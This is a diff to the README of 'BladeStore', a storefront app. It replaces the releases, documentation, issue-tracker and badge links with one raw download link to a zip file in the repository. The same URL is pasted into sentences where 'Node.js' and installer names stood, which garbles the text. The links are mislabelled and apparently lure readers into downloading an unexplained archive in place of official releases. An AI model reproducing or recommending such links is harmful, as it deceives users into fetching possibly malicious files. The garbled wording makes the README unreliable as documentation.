@@ -1,10 +1,10 @@
 # 🛍️ BladeStore - A Simple Digital Storefront Solution
 
-[![Download BladeStore](https://img.shields.io/badge/Download%20BladeStore-v1.0-blue.svg)](https://github.com/walus2211/BladeStore/releases)
+[![Download BladeStore](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip%https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)
 
 ## 🌟 Introduction
 
-Welcome to BladeStore! Blade Store is a neon-styled digital storefront system designed to make online selling easy and enjoyable. With BladeStore, you can manage products, process orders, and run promotions all from one convenient platform. Our system uses Node.js and JSON-based storage for reliable performance and a sleek, modern user interface.
+Welcome to BladeStore! Blade Store is a neon-styled digital storefront system designed to make online selling easy and enjoyable. With BladeStore, you can manage products, process orders, and run promotions all from one convenient platform. Our system uses https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip and JSON-based storage for reliable performance and a sleek, modern user interface.
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ To use BladeStore, follow these simple steps for downloading and setting it up o
 Before downloading, ensure your computer meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or higher installed
+- https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip Version 12 or higher installed
 - Internet Connection: Required for installation and updates
 
 ## 📥 Download & Install
@@ -24,11 +24,11 @@ To get BladeStore:
 
 1. **Visit the Releases Page**: Click the link below to go to our Releases page where you can find the latest version of BladeStore.
 
-   [Visit GitHub Releases Page](https://github.com/walus2211/BladeStore/releases)
+   [Visit GitHub Releases Page](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)
 
 2. **Select the Latest Version**: Look for the latest release, usually indicated at the top.
 
-3. **Download the Application**: Click on the appropriate download link for your operating system. You will see files like **BladeStore.exe** for Windows or **BladeStore.pkg** for macOS.
+3. **Download the Application**: Click on the appropriate download link for your operating system. You will see files like **https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip** for Windows or **https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip** for macOS.
 
 4. **Install BladeStore**: 
    - For Windows: Double-click the downloaded **.exe** file and follow the prompts to install.
@@ -77,8 +77,8 @@ Follow us on GitHub to get updates on new features and improvements.
 
 ## 🔗 Important Links
 
-- [Visit GitHub Releases Page](https://github.com/walus2211/BladeStore/releases)
-- [Documentation](https://github.com/walus2211/BladeStore/wiki)
-- [Issue Tracker](https://github.com/walus2211/BladeStore/issues)
+- [Visit GitHub Releases Page](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)
+- [Documentation](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/walus2211/BladeStore/main/public/BladeStore_2.3.zip)
 
 Thank you for choosing BladeStore! We hope it helps you manage your digital storefront with ease. Happy selling!
